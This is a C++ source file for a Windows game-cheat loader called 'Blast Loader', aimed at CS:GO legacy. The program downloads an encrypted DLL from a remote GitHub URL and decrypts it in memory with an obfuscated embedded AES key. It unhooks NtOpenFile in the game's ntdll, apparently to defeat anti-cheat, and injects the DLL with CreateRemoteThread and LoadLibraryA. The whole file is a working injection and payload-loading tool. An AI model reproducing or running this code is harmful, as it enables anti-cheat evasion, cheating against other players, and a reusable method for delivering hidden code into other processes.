#include <Windows.h>
#include <TlHelp32.h>
#include <wininet.h>
#include <bcrypt.h>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <thread>
#include <vector>
#include <string>
#include <memory>

namespace
{
    // ─────────────────────────────────────────────────────────────────
    // CONFIGURATION — EDIT THESE VALUES BEFORE BUILDING
    // ─────────────────────────────────────────────────────────────────

    // Encrypted DLL download URL (HTTPS, raw file)
    // Example: "https://github.com/user/repo/releases/latest/download/blast_client.dll.enc"
    constexpr const char* kEncryptedDllUrl = "https://raw.githubusercontent.com/nikhil918ss/projectblastoff/master/blast_client.dll.enc";

    // Version check URL (returns JSON: {"version": "1.0.1", "url": "..."})
    // Optional — if empty, skips version check
    constexpr const char* kVersionCheckUrl = "https://raw.githubusercontent.com/nikhil918ss/projectblastoff/master/version.json";

    // Current loader version
    constexpr const char* kLoaderVersion = "1.0.0";

    // AES-256 key (32 bytes) — OBFUSCATED at build time by EncryptDll.py
    // DO NOT EDIT MANUALLY — run EncryptDll.py to generate

    constexpr BYTE kObfuscationSeed = 0x6B;

    constexpr BYTE kObfuscatedKey[32] = {
            0x38, 0x8D, 0x45, 0xCF, 0x2A, 0xF4, 0xF1, 0x09,
            0xC5, 0xEC, 0xFD, 0x54, 0xF4, 0x99, 0xF6, 0xD8,
            0x8B, 0xBF, 0x6A, 0x1E, 0x33, 0x1A, 0x3F, 0x6E,
            0x93, 0x26, 0xD7, 0x60, 0xEE, 0xC6, 0x76, 0x11,
    };

    constexpr BYTE kObfuscatedIV[16] = {
            0xD6, 0x9E, 0x89, 0x98, 0x6B, 0x67, 0xA5, 0x9D,
            0x47, 0x18, 0x96, 0xB6, 0xCF, 0x13, 0x39, 0xFD,
    };

    // DLL name for injection (after decryption, written to temp file)
    constexpr const char* kTempDllPrefix = "blast_";

    constexpr const char* kWindowClass = "Valve001";
    constexpr DWORD kProcessAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

    // ─────────────────────────────────────────────────────────────────
    // UTILITIES
    // ─────────────────────────────────────────────────────────────────

    void PrintBanner()
    {
        SetConsoleTitleA("Blast Loader");
        std::puts("╔══════════════════════════════════════════════════════════╗");
        std::printf("║  Blast Loader v%-47s║\n", kLoaderVersion);
        std::puts("║  Encrypted DLL injection for CS:GO legacy                ║");
        std::puts("╚══════════════════════════════════════════════════════════╝");
        std::puts("");
    }

    void PrintStatus(const char* label, const char* message)
    {
        std::printf("%s %s\n", label, message);
    }

    void PrintError(const char* message, DWORD error = 0)
    {
        if (error)
            std::printf("[-] %s (Error: %lu)\n", message, error);
        else
            std::printf("[-] %s\n", message);
    }

    // Simple XOR + rotate deobfuscation
    void Deobfuscate(const BYTE* input, size_t len, BYTE seed, BYTE* output)
    {
        for (size_t i = 0; i < len; i++)
        {
            BYTE b = input[i];
            b ^= seed;
            b = (BYTE)((b >> 3) | (b << 5)); // ROL 3 (inverse of ROR 3)
            b ^= (BYTE)(seed + i);
            output[i] = b;
        }
    }

    // ─────────────────────────────────────────────────────────────────
    // HTTP DOWNLOAD (WinINet)
    // ─────────────────────────────────────────────────────────────────

    std::vector<BYTE> DownloadFile(const char* url)
    {
        std::vector<BYTE> result;

        HINTERNET hInternet = InternetOpenA("BlastLoader/1.0", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
        if (!hInternet)
        {
            PrintError("InternetOpen failed", GetLastError());
            return result;
        }

        HINTERNET hUrl = InternetOpenUrlA(hInternet, url, nullptr, 0,
            INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hUrl)
        {
            PrintError("InternetOpenUrl failed", GetLastError());
            InternetCloseHandle(hInternet);
            return result;
        }

        constexpr size_t kBufferSize = 8192;
        BYTE buffer[kBufferSize];
        DWORD bytesRead = 0;

        while (InternetReadFile(hUrl, buffer, kBufferSize, &bytesRead) && bytesRead > 0)
        {
            result.insert(result.end(), buffer, buffer + bytesRead);
        }

        DWORD error = GetLastError();
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);

        if (error != ERROR_SUCCESS && error != ERROR_INSUFFICIENT_BUFFER)
        {
            PrintError("InternetReadFile failed", error);
            result.clear();
        }

        return result;
    }

    // ─────────────────────────────────────────────────────────────────
    // AES-256-CBC DECRYPTION (Windows CNG)
    // ─────────────────────────────────────────────────────────────────

    std::vector<BYTE> DecryptAes256Cbc(const BYTE* encrypted, size_t encryptedLen,
        const BYTE* key, const BYTE* iv)
    {
        std::vector<BYTE> result;

        BCRYPT_ALG_HANDLE hAlg = nullptr;
        BCRYPT_KEY_HANDLE hKey = nullptr;

        NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (status != 0)
        {
            PrintError("BCryptOpenAlgorithmProvider failed", status);
            return result;
        }

        status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        if (status != 0)
        {
            PrintError("BCryptSetProperty failed", status);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return result;
        }

        status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key, 32, 0);
        if (status != 0)
        {
            PrintError("BCryptGenerateSymmetricKey failed", status);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return result;
        }

        DWORD blockSize = 0;
        DWORD cbData = 0;
        status = BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (PUCHAR)&blockSize, sizeof(blockSize), &cbData, 0);
        if (status != 0)
        {
            PrintError("BCryptGetProperty failed", status);
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return result;
        }

        // Allocate output buffer (same size as input for CBC with PKCS7)
        result.resize(encryptedLen);

        // Copy IV since BCryptDecrypt modifies it
        BYTE ivCopy[16];
        memcpy(ivCopy, iv, 16);

        ULONG decryptedLen = 0;
        status = BCryptDecrypt(hKey, (PUCHAR)encrypted, (ULONG)encryptedLen, nullptr, ivCopy, 16,
            result.data(), (ULONG)result.size(), &decryptedLen, BCRYPT_BLOCK_PADDING);

        if (status != 0)
        {
            PrintError("BCryptDecrypt failed", status);
            result.clear();
        }
        else
        {
            result.resize(decryptedLen);
        }

        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return result;
    }

    // ─────────────────────────────────────────────────────────────────
    // PE VALIDATION
    // ─────────────────────────────────────────────────────────────────

    bool ValidatePeHeader(const BYTE* dll, size_t len)
    {
        if (len < 64) return false;
        if (dll[0] != 0x4D || dll[1] != 0x5A) return false; // MZ

        DWORD peOffset = *reinterpret_cast<const DWORD*>(dll + 0x3C);
        if (peOffset + 4 >= len) return false;
        if (dll[peOffset] != 0x50 || dll[peOffset + 1] != 0x45 ||
            dll[peOffset + 2] != 0x00 || dll[peOffset + 3] != 0x00)
            return false; // PE\0\0

        // Check it's 32-bit (Machine == 0x14c)
        if (peOffset + 0x16 >= len) return false;
        WORD machine = *reinterpret_cast<const WORD*>(dll + peOffset + 0x4);
        if (machine != 0x14c) return false;

        return true;
    }

    // ─────────────────────────────────────────────────────────────────
    // VERSION CHECK
    // ─────────────────────────────────────────────────────────────────

    struct VersionInfo
    {
        char version[32] = { 0 };
        char url[256] = { 0 };
    };

    bool ParseVersionJson(const std::vector<BYTE>& jsonData, VersionInfo* outInfo)
    {
        // Simple JSON parser for {"version": "x.y.z", "url": "..."}
        const char* str = reinterpret_cast<const char*>(jsonData.data());

        auto findField = [&](const char* field, char* out, size_t outSize) -> bool {
            const char* p = strstr(str, field);
            if (!p) return false;
            p = strchr(p, ':');
            if (!p) return false;
            p = strchr(p, '"');
            if (!p) return false;
            p++; // skip opening quote
            const char* end = strchr(p, '"');
            if (!end) return false;
            size_t fieldLen = end - p;
            if (fieldLen >= outSize) fieldLen = outSize - 1;
            memcpy(out, p, fieldLen);
            out[fieldLen] = '\0';
            return true;
        };

        if (!findField("version", outInfo->version, sizeof(outInfo->version))) return false;
        findField("url", outInfo->url, sizeof(outInfo->url)); // optional
        return true;
    }

    bool IsNewerVersion(const char* remote, const char* local)
    {
        auto parseVersion = [](const char* v, int& major, int& minor, int& patch) -> bool {
            int count = sscanf(v, "%d.%d.%d", &major, &minor, &patch);
            return count >= 2;
        };

        int rMajor, rMinor, rPatch;
        int lMajor, lMinor, lPatch;

        if (!parseVersion(remote, rMajor, rMinor, rPatch)) return false;
        if (!parseVersion(local, lMajor, lMinor, lPatch)) return false;

        if (rMajor != lMajor) return rMajor > lMajor;
        if (rMinor != lMinor) return rMinor > lMinor;
        return rPatch > lPatch;
    }

    void CheckForUpdate()
    {
        if (!kVersionCheckUrl || strlen(kVersionCheckUrl) == 0) return;

        std::vector<BYTE> jsonData = DownloadFile(kVersionCheckUrl);
        if (jsonData.empty()) return;

        VersionInfo info;
        if (!ParseVersionJson(jsonData, &info)) return;

        if (IsNewerVersion(info.version, kLoaderVersion))
        {
            PrintStatus("[!]", ("Update available: v" + std::string(info.version) + " (current: v" + kLoaderVersion + ")").c_str());
            if (strlen(info.url) > 0)
            {
                PrintStatus("[*]", ("Download: " + std::string(info.url)).c_str());
            }
        }
    }

    // ─────────────────────────────────────────────────────────────────
    // PROCESS HANDLING
    // ─────────────────────────────────────────────────────────────────

    void RestoreNtOpenFile(HANDLE hProcess)
    {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll");
        LPVOID pLocal = reinterpret_cast<LPVOID>(GetProcAddress(hNtdll, "NtOpenFile"));
        if (!pLocal) return;

        auto GetModBaseLambda = [](DWORD pid, const wchar_t* name) -> LPVOID {
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
            if (snap == INVALID_HANDLE_VALUE) return nullptr;
            MODULEENTRY32W me{};
            me.dwSize = sizeof(me);
            LPVOID base = nullptr;
            for (BOOL ok = Module32FirstW(snap, &me); ok; ok = Module32NextW(snap, &me))
            {
                if (!_wcsicmp(me.szModule, name))
                {
                    base = me.modBaseAddr;
                    break;
                }
            }
            CloseHandle(snap);
            return base;
        };

        DWORD pid = GetProcessId(hProcess);
        LPVOID pRemote = GetModBaseLambda(pid, L"ntdll.dll");
        if (!pRemote) return;

        LPVOID target = (LPVOID)((uintptr_t)pRemote + ((uintptr_t)pLocal - (uintptr_t)hNtdll));

        char orig[5] = { 0 };

        wchar_t path[MAX_PATH];
        GetSystemDirectoryW(path, MAX_PATH);
        wcscat_s(path, L"\\ntdll.dll");

        HMODULE hFresh = LoadLibraryExW(path, nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (hFresh)
        {
            LPVOID pFn = reinterpret_cast<LPVOID>(GetProcAddress(hFresh, "NtOpenFile"));
            if (pFn) memcpy(orig, pFn, 5);
            FreeLibrary(hFresh);
        }

        if (!*(DWORD*)orig)
            return;

        DWORD oldProt;
        if (VirtualProtectEx(hProcess, target, 5, PAGE_EXECUTE_READWRITE, &oldProt))
        {
            WriteProcessMemory(hProcess, target, orig, 5, nullptr);
            VirtualProtectEx(hProcess, target, 5, oldProt, &oldProt);
        }
    }

    HWND WaitForGameWindow(DWORD& processId)
    {
        PrintStatus("[*]", "Waiting for CS:GO...");

        HWND window = nullptr;
        while (!window)
        {
            window = FindWindowA(kWindowClass, nullptr);
            if (!window)
            {
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
                continue;
            }

            GetWindowThreadProcessId(window, &processId);
        }

        return window;
    }

    bool IsDllLoaded(HANDLE hProcess)
    {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(hProcess));
        if (snap == INVALID_HANDLE_VALUE) return false;

        MODULEENTRY32W me{};
        me.dwSize = sizeof(me);
        for (BOOL ok = Module32FirstW(snap, &me); ok; ok = Module32NextW(snap, &me))
        {
            char moduleName[260];
            wcstombs(moduleName, me.szModule, sizeof(moduleName));
            _strlwr_s(moduleName);
            if (strstr(moduleName, "blast_client.dll"))
            {
                CloseHandle(snap);
                return true;
            }
        }
        CloseHandle(snap);
        return false;
    }

} // namespace

// ─────────────────────────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────────────────────────

int main()
    {
        PrintBanner();

        // Check for updates
        CheckForUpdate();

        // Deobfuscate key and IV
        BYTE key[32];
        BYTE iv[16];
        Deobfuscate(kObfuscatedKey, 32, kObfuscationSeed, key);
        Deobfuscate(kObfuscatedIV, 16, kObfuscationSeed, iv);

        DWORD processId = 0;
        WaitForGameWindow(processId);
        std::printf("[+] Found CS:GO (PID: %lu)\n", processId);

        HANDLE hProcess = OpenProcess(kProcessAccess, FALSE, processId);
        if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
        {
            PrintError("Failed to open process. Run as administrator.", GetLastError());
            return 1;
        }

        // Check if already loaded
        if (IsDllLoaded(hProcess))
        {
            PrintStatus("[!]", "blast_client.dll already loaded in target process.");
            PrintStatus("[!]", "Restart CS:GO to load a new version.");
            CloseHandle(hProcess);
            std::puts("\nPress any key to exit...");
            std::getchar();
            return 1;
        }

        RestoreNtOpenFile(hProcess);

        // Download encrypted DLL
        PrintStatus("[*]", "Downloading encrypted DLL...");
        std::vector<BYTE> encryptedDll = DownloadFile(kEncryptedDllUrl);
        if (encryptedDll.empty())
        {
            PrintError("Failed to download encrypted DLL");
            CloseHandle(hProcess);
            std::puts("\nPress any key to exit...");
            std::getchar();
            return 1;
        }
        std::printf("[+] Downloaded %zu bytes\n", encryptedDll.size());

        // Decrypt in memory
        PrintStatus("[*]", "Decrypting DLL in memory...");
        std::vector<BYTE> dllBytes = DecryptAes256Cbc(encryptedDll.data(), encryptedDll.size(), key, iv);
        if (dllBytes.empty())
        {
            PrintError("Decryption failed (wrong key or corrupted download)");
            CloseHandle(hProcess);
            std::puts("\nPress any key to exit...");
            std::getchar();
            return 1;
        }
        std::printf("[+] Decrypted: %zu bytes\n", dllBytes.size());

        // Validate PE header
        if (!ValidatePeHeader(dllBytes.data(), dllBytes.size()))
        {
            PrintError("Invalid PE header after decryption");
            CloseHandle(hProcess);
            std::puts("\nPress any key to exit...");
            std::getchar();
            return 1;
        }

        // Write decrypted DLL to temp file
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        char guid[37];
        // Simple random name
        DWORD tick = GetTickCount();
        sprintf_s(guid, "%s%08X.dll", kTempDllPrefix, tick);
        strcat_s(tempPath, guid);

        HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            PrintError("Failed to create temp DLL", GetLastError());
            CloseHandle(hProcess);
            std::puts("\nPress any key to exit...");
            std::getchar();
            return 1;
        }

        DWORD written = 0;
        if (!WriteFile(hFile, dllBytes.data(), (DWORD)dllBytes.size(), &written, nullptr))
        {
            PrintError("Failed to write temp DLL", GetLastError());
            CloseHandle(hFile);
            CloseHandle(hProcess);
            std::puts("\nPress any key to exit...");
            std::getchar();
            return 1;
        }
        CloseHandle(hFile);

        std::printf("[+] Temp DLL: %s\n", tempPath);

        // Inject via LoadLibraryA
        const SIZE_T pathLength = strlen(tempPath) + 1;
        LPVOID remotePath = VirtualAllocEx(hProcess, nullptr, pathLength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (!remotePath)
        {
            PrintError("VirtualAllocEx failed", GetLastError());
            DeleteFileA(tempPath);
            CloseHandle(hProcess);
            std::puts("\nPress any key to exit...");
            std::getchar();
            return 1;
        }

        std::printf("[+] Allocated remote memory at 0x%p\n", remotePath);

        if (!WriteProcessMemory(hProcess, remotePath, tempPath, pathLength, nullptr))
        {
            PrintError("WriteProcessMemory failed", GetLastError());
            VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
            DeleteFileA(tempPath);
            CloseHandle(hProcess);
            std::puts("\nPress any key to exit...");
            std::getchar();
            return 1;
        }

        FARPROC loadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        if (!loadLibrary)
        {
            PrintError("Failed to locate LoadLibraryA", GetLastError());
            VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
            DeleteFileA(tempPath);
            CloseHandle(hProcess);
            std::puts("\nPress any key to exit...");
            std::getchar();
            return 1;
        }

        std::printf("[+] LoadLibraryA at 0x%p\n", reinterpret_cast<void*>(loadLibrary));

        HANDLE remoteThread = CreateRemoteThread(
            hProcess,
            nullptr,
            0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(loadLibrary),
            remotePath,
            0,
            nullptr
        );

        if (!remoteThread || remoteThread == INVALID_HANDLE_VALUE)
        {
            PrintError("CreateRemoteThread failed", GetLastError());
            VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
            DeleteFileA(tempPath);
            CloseHandle(hProcess);
            std::puts("\nPress any key to exit...");
            std::getchar();
            return 1;
        }

        PrintStatus("[*]", "Waiting for remote thread...");
        WaitForSingleObject(remoteThread, INFINITE);

        DWORD exitCode = 0;
        GetExitCodeThread(remoteThread, &exitCode);
        std::printf("[+] LoadLibrary returned 0x%lX\n", exitCode);

        // Clean up
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(remoteThread);
        CloseHandle(hProcess);

        // Delete temp file
        DeleteFileA(tempPath);

        if (exitCode == 0)
        {
            PrintError("DLL failed to load. Check the path and architecture.");
        }
        else
        {
            PrintStatus("[+]", "DLL injected successfully.");
        }

        std::puts("\nClosing in 2 seconds...");
        Sleep(2000);
        return exitCode == 0 ? 1 : 0;
    }